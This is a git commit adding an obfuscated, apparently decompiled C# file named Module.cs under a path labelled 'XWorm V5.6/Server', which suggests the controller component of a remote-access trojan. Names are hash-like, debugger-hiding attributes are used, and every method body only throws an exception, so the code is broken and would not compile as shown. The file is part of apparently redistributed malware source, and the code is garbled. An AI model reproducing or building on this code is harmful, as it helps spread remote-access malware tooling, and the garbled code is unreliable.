2d5d00caef727760c0ad08130aa7d69bca570197
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:49:46 +0400

    Module.cs

---
+++ XWorm V5.6/Server/Module.cs
@@ -0,0 +1,180 @@
+﻿using AB892649DCEFA60A6C98F59179B35916;
+using EA7FF2D0C489326F0D2AFFF69BA6F82C;
+using F06F1FD782A797E66A8C9D7976456227;
+using M5E7485F8B1A1AD7481M48DMCMC4A3DC;
+using M95F4E5MF7905418B3E7M3BBMCM33E92;
+using M9A828E42D759F365M284C3875E9D76M;
+using Microsoft.VisualBasic.ApplicationServices;
+using N1C62C6F47393CBF2355AN5E34307DD0;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Drawing;
+using System.Globalization;
+using System.Resources;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using V462540EVV6738320BEAVB181B7B6441;
+
+internal class \u003CModule\u003E
+{
+  private static readonly FBCF76B6A3F89BF7637391A1E447D6AB.ThreadSafeObjectProvider<VB78A3E6E8DF638C2DV113AV7CD8B3DD> C0E98E4CB9A771908890FA3D9AC733D3 = new FBCF76B6A3F89BF7637391A1E447D6AB.ThreadSafeObjectProvider<VB78A3E6E8DF638C2DV113AV7CD8B3DD>();
+  private static readonly FBCF76B6A3F89BF7637391A1E447D6AB.ThreadSafeObjectProvider<B2673BC82C5B1B0F6BAC43DC322CA48B> A112A5F0D5FD85232C98905B0916B4F7 = new FBCF76B6A3F89BF7637391A1E447D6AB.ThreadSafeObjectProvider<B2673BC82C5B1B0F6BAC43DC322CA48B>();
+  private static readonly FBCF76B6A3F89BF7637391A1E447D6AB.ThreadSafeObjectProvider<User> A9935DFA49334B49F7A5D5726B82B58B = new FBCF76B6A3F89BF7637391A1E447D6AB.ThreadSafeObjectProvider<User>();
+  private static FBCF76B6A3F89BF7637391A1E447D6AB.ThreadSafeObjectProvider<FBCF76B6A3F89BF7637391A1E447D6AB.MyForms> VV99A8VE961960BBV8V0578F5B85AA10 = new FBCF76B6A3F89BF7637391A1E447D6AB.ThreadSafeObjectProvider<FBCF76B6A3F89BF7637391A1E447D6AB.MyForms>();
+  private static readonly FBCF76B6A3F89BF7637391A1E447D6AB.ThreadSafeObjectProvider<FBCF76B6A3F89BF7637391A1E447D6AB.MyWebServices> V4891AA45E363B96241V8FF71FFD47CC = new FBCF76B6A3F89BF7637391A1E447D6AB.ThreadSafeObjectProvider<FBCF76B6A3F89BF7637391A1E447D6AB.MyWebServices>();
+  private static ResourceManager V57F1DB32DBCA11E23FCC7997066DD5C;
+  private static CultureInfo B3537F89F3EB36FCF45694503F3D2C92;
+  private static VEF87313E4DDFCV3A9EE7908EAV73C56 V9E7DEFV177BBC8C3067A0073440VDVB;
+  private static bool V044B7DBAD4D6A1FCVBV5D6C1FC1C103;
+  private static object E665199918FE8F7F9200DE2CB7A76DA0;
+  private IContainer V0VC8VE3FC18146AD30F6C0D14630VEB;
+  private IContainer CBD4B10EAAEBFC8CC201BE6EB947A048;
+  public FE2B86A9D832C0656F97BF8FC7D65AE7 VF6556DB0B1F281FA1B3VV3AE40523E0;
+  private IContainer V4BA974B1CC5BF049148AA3DEEVACB9A;
+  public FE2B86A9D832C0656F97BF8FC7D65AE7 VA5DB7FA26D479E53C18D99555D68474;
+  public bool C1D641983F4730FA3584B882FE1C0393;
+  public string V631B40A6CA359498BCVCCE3B36VE7FE;
+  private IContainer B2450DE5B4EC386D045F66C5BB1F9F8B;
+  private IContainer V1482CA33V680B934CAC1B02EC298C4B;
+  private IContainer EC98013394C8E0F8EA8A65B3D850A3A2;
+  private TimeSpan V1E78C23DE79B7FC13470FC734E4V64A;
+  private Stopwatch S83B5DA0C4FS8E34ACBF606E6S722528;
+  public static List<FE2B86A9D832C0656F97BF8FC7D65AE7> SSB8B8B3575782111E87SA3B6E17ECE2;
+  private IContainer S15877D47CB55SDA3AB0B4B819S750DS;
+  public FE2B86A9D832C0656F97BF8FC7D65AE7 S499FD2FS41CS3D2F4757FS59SS2C9C5;
+  public string B2C23AE945E1C5CB2A12E7E022F1C212;
+  private IContainer BB6584CECB23C44074EEB7FAD3F60BDD;
+  public FE2B86A9D832C0656F97BF8FC7D65AE7 SE12ABC803BB1140832B4CA1C8FA5F54;
+  private IContainer C625631BC9A9639AAB06AFABE848424D;
+  public FE2B86A9D832C0656F97BF8FC7D65AE7 S9D044EC790SF06BF8998DC54EE33DS5;
+  public string C5C4ABCDDBA89C914208DE80D9EE4292;
+  public string CABEA9F329CCEB299C7A8AA0CE51B4F1;
+  public string S011499E27254B753DDD733DC415F85E;
+  private IContainer C2CAF6ED1A6C653ED05A5C4A4514A9C5;
+  public string C8BC23ECF74CD780905ACA8250B5E337;
+  public string C6177CB3951C24C4A55171A3DA9CA586;
+  public bool C0341FC501B57CC3900FA9122D3C319B;
+  public bool C7C5FBEA8AFC3583C6DACE4281CC181D;
+  public string CC79B6C114A1C0ECEF25ECBEA3EAD59C;
+  public string CCBCCCD0D07AFCE44D48F354A4C985E7;
+  public string C38ACEC3776128318A5721095A106D25;
+  public string CC3DB78D341A9431AF7C305A19184BCE;
+  public string CADFCB6C755B900CC6B5910A51D9F445;
+  private IContainer BD42B083BFD52BC5D24469FA62BF19F5;
+  public FE2B86A9D832C0656F97BF8FC7D65AE7 FE938E4503A207AACD5EA2E8F013D52D;
+  private IContainer L220B7E0L0E5020DB47C8C7D8C2491FE;
+  public FE2B86A9D832C0656F97BF8FC7D65AE7 E0A7F3A04D13B27EDC45BD34A07A79F1;
+  public int L855135F49LCB83B6LB3L1EA58L76L0A;
+  public Stopwatch L74D88D39511CF11F9FA17A5B8CE0EC6;
+  public Size FADFCC8EB4C2A5ED1323A670A16DAAA6;
+  private IContainer L4D0FECB809FBLE0L7D45EEA37AC461D;
+  public MBF622CC1C2FEBE494M27DB44DE5F45D HCF095AA08EA074BE24F6C27CH7374A4;
+  private List<M4790M163EDC4E5C4E0641M779E340A1> D618BBFCFB48EDE3656BA112881BE9E5;
+  public static List<F37068503FD78A2484752A672949A328> H4068E9B240049F5B388B5HA908HB4E3;
+  public static bool HF3A22F4618685007B3D48CFB5A207EA;
+  private IContainer A4115CF698E95F6F00C160F598EE964B;
+  public FE2B86A9D832C0656F97BF8FC7D65AE7 A1FD45E825DE873FD743E9F24485C2DE;
+  public int AF16ABE33B3EA71CA4F1263F6771B417;
+  public int BE07103597A0B5834B309ECE2256B394;
+  private int A2F786A9AA1CB976CC2C9E9112B76712;
+  private bool A104A9C6A978948597A4BA3EA0648EFE;
+  private bool A1106DB8AF574AEA8BB52A0A04C2476C;
+  private int A3F2281190312AFC2B5E8B35C9D68EE3;
+  private bool A9D2BDA7A1AA0F567020A1F3E1B60EA0;
+  private bool A171251976C6AEE37F5577F1117AEEC0;
+  public int E01F6FD52A72413DBCC4F3D299033586;
+  public Stopwatch A860825E6C7424F333D84BEBE0AD36A7;
+  private IContainer UCFB1U057F1B2703513B5470UF15F850;
+  public FE2B86A9D832C0656F97BF8FC7D65AE7 A9690AC299C34A08FD0D926D1FFB571B;
+  public int FEC9C2A2F623491F86B3029C2AEA7C4B;
+  public Stopwatch UA2FBF6CDE4FC43A1C2UC29171C9A29D;
+  public Size E34EC7238195477428511F3EE2D34C91;
+  private IContainer UU33B0065UF868DF14BF34B8013D6FC5;
+
+  [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
+  public extern \u003CModule\u003E(object TargetObject, IntPtr TargetMethod);
+
+  [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
+  public virtual extern IAsyncResult BeginInvoke(
+    AsyncCallback DelegateCallback,
+    object DelegateAsyncState);
+
+  [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
+  public virtual extern void EndInvoke(IAsyncResult DelegateAsyncResult);
+
+  [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
+  public virtual extern void Invoke();
+
+  [STAThread]
+  [DebuggerHidden]
+  [EditorBrowsable(EditorBrowsableState.Advanced)]
+  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
+  internal static void NN8C18N64ND81E55F7F18E8BAN9N7AN1(string[] Args)
+  {
+    try
+    {
+    }
+    finally
+    {
+label_2:
+      throw new Exception("え");
+    }
+    goto label_2;
+  }
+
+  [DebuggerStepThrough]
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  public \u003CModule\u003E() => throw new Exception("ヸ");
+
+  [DebuggerStepThrough]
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  protected virtual void OnCreateMainForm() => throw new Exception("ぬ");
+
+  [DebuggerHidden]
+  [EditorBrowsable(EditorBrowsableState.Never)]
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  public \u003CModule\u003E() => throw new Exception("ぎ");
+
+  [DebuggerHidden]
+  [SpecialName]
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  internal static VB78A3E6E8DF638C2DV113AV7CD8B3DD get_Computer() => throw new Exception("ぜ");
+
+  [DebuggerHidden]
+  [SpecialName]
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  internal static B2673BC82C5B1B0F6BAC43DC322CA48B get_Application() => throw new Exception("ゅ");
+
+  [DebuggerHidden]
+  [SpecialName]
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  internal static User get_User() => throw new Exception("ぇ");
+
+  [DebuggerHidden]
+  [SpecialName]
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  internal static FBCF76B6A3F89BF7637391A1E447D6AB.MyForms get_Forms() => throw new Exception("び");
+
+  [DebuggerHidden]
+  [SpecialName]
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  internal static FBCF76B6A3F89BF7637391A1E447D6AB.MyWebServices get_WebServices() => throw new Exception("ぺ");
+
+  public delegate void IV([In] bool obj0, [In] IntPtr obj1, [In] IntPtr[] obj2, [In] IntPtr[] obj3, [In] int obj4);
+
+  private sealed class \u003C\u003Ec__DisplayClass17_0
+  {
+    public string rtNameX86;
+
+    internal bool \u003CInitialize\u003Eb__0([In] string obj0) => obj0.EndsWith(this.rtNameX86);
+  }
+
+  private sealed class \u003C\u003Ec__DisplayClass17_1
+  {
+    public string rtNameX64;
+
+    internal bool \u003CInitialize\u003Eb__1([In] string obj0) => obj0.EndsWith(this.rtNameX64);
+  }
+}
